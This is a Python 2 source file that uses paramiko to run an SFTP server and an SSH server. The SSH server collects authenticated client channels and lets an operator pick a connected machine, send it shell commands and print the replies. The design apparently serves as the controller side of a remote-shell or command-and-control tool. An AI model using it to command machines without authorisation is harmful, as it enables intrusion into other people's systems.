# -*- coding: utf-8 -*-
import sys
import time
import socket
import threading
import traceback
from collections import namedtuple

import paramiko
from sftpserver.stub_sftp import StubServer, StubSFTPServer

from utils import threaded, is_want_to_close


def create_server_socket(host, port, backlog):
    """
    Creates a server socket that listening for connections.

    :param backlog: the number of unaccepted connections that the system
                    will allow before refusing new connections.
    :type backlog: int
    """

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
    except Exception as e:
        print '*** Bind failed: ' + str(e)
        traceback.print_exc()
        sys.exit(1)

    try:
        server_socket.listen(backlog)
    except Exception as e:
        print '*** Listen failed: ' + str(e)
        traceback.print_exc()
        sys.exit(1)

    return server_socket


def accept_connection_from_outside(server_socket):
    """
    Accepts a connection from outside.

    :returns: (socket object, address info)
    :rtype: tuple
    """

    try:
        return server_socket.accept()
    except Exception as e:
        print '*** Accept failed: ' + str(e)
        traceback.print_exc()
        sys.exit(1)


class SFTPServer:

    def __init__(self, host, port, backlog, host_key):
        self._host = host
        self._port = port
        self._backlog = backlog
        self._host_key = host_key
        self._server_socket = create_server_socket(self._host, self._port,
                                                   self._backlog)

    def run(self):
        try:
            self.authenticate_clients()
        except:
            print '*** SFTP authentication failed'
            traceback.print_exc()
            sys.exit(1)

    @threaded(daemon=True)
    def authenticate_clients(self):
        while True:
            client_socket, address = accept_connection_from_outside(
                self._server_socket)

            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self._host_key)
            transport.set_subsystem_handler(
                'sftp', paramiko.SFTPServer, StubSFTPServer
            )

            server = StubServer()
            try:
                transport.start_server(server=server)
            except Exception as e:
                print '*** SFTP negotiation failed: ' + str(e)
                traceback.print_exc()
                sys.exit(1)

            channel = transport.accept()
            while transport.is_active():
                time.sleep(1)


class SSHServerInterface(paramiko.ServerInterface):

    def __init__(self, username, password):
        self.event = threading.Event()
        self._username = username
        self._password = password

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == self._username) and (password == self._password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


class SSHServer:

    Client = namedtuple('Client', 'address, channel')

    def __init__(self, host, port, backlog, username, password, host_key):
        self._host = host
        self._port = port
        self._backlog = backlog
        self._username = username
        self._password = password
        self._host_key = host_key
        self._server_socket = create_server_socket(self._host, self._port,
                                                   self._backlog)

        self.connected_clients = {}
        self.current_client = None

    def run(self):
        try:
            self.authenticate_clients()
        except:
            print '*** SSH authentication failed'
            traceback.print_exc()
            sys.exit(1)

        try:
            self.execute_shell_commands()
        except:
            print '*** Execution of shell commands failed'
            traceback.print_exc()
            sys.exit(1)

    @threaded(daemon=True)
    def authenticate_clients(self):
        while True:
            client_socket, address = accept_connection_from_outside(
                self._server_socket)

            print 'Got a connection from ' + str(address)

            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self._host_key)

            server = SSHServerInterface(self._username, self._password)
            try:
                transport.start_server(server=server)
            except paramiko.SSHException:
                print '*** SSH negotiation failed'
                traceback.print_exc()
                sys.exit(1)

            channel = transport.accept()
            if channel is None:
                print '*** No channel'
                sys.exit(1)

            print 'Authenticated!'
            self.connected_clients.update({address[0]: channel})

    def execute_shell_commands(self):
        while True:
            if self.connected_clients:

                if self.current_client is None:
                    self.change_current_client()

                command = raw_input('(%s) $ ' % (self.current_client.address))

                if command == 'switch':
                    self.change_current_client()
                elif command == 'list':
                    self.show_connected_clients()
                elif command == 'exit':
                    self.current_client.channel.send(command)
                    self.current_client.channel.close()
                    del self.connected_clients[self.current_client.address]
                    self.current_client = None
                    if not self.connected_clients and is_want_to_close():
                        break
                else:
                    self.current_client.channel.send(command)
                    response = self.current_client.channel.recv(1024)
                    print response

    def change_current_client(self):
        self.show_connected_clients()
        while True:
            try:
                address = raw_input('Enter address you want to connect to: ')
                self.current_client = self.Client(
                    address, self.connected_clients[address])
            except KeyError:
                print 'Incorrect address'
                continue
            else:
                break


    def show_connected_clients(self):
        print 'Connected clients to the server: '
        print '\n'.join(self.connected_clients.keys())
